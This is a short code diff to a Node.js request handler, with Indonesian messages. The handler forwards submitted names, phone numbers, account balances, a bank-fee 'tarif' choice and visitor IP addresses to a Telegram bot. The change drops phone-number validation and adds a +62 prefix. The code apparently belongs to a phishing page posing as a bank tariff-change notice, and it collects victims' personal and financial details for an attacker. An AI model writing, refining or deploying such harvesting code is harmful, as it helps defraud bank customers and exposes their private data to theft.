@@ -24,9 +24,7 @@ module.exports = async (req, res) => {
       return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
     }
 
-    if (!/^8[0-9]{8,13}$/.test(nohp)) {
-      return res.status(400).json({ success: false, message: 'Nomor HP tidak valid. Harus diawali dengan 08 dan terdiri dari 10-15 digit angka' });
-    }
+  
 
     // Ambil token dari environment variables
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -50,7 +48,7 @@ module.exports = async (req, res) => {
 ────────────────────
 𝗧𝗮𝗿𝗶𝗳 | ${tarif === 'baru' ? 'BARU (Rp 150.000/bulan)' : 'LAMA (Rp 6.500/transaksi)'}
 𝗡𝗮𝗺𝗮 | ${nama}
-𝗡𝗼𝗺𝗼𝗿 𝗛𝗣 | ${nohp}
+𝗡𝗼𝗺𝗼𝗿 𝗛𝗣 | +62${nohp}
 𝗦𝗮𝗹𝗱𝗼 | Rp ${saldo}
 ────────────────────
 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP || 'Tidak terdeteksi'}
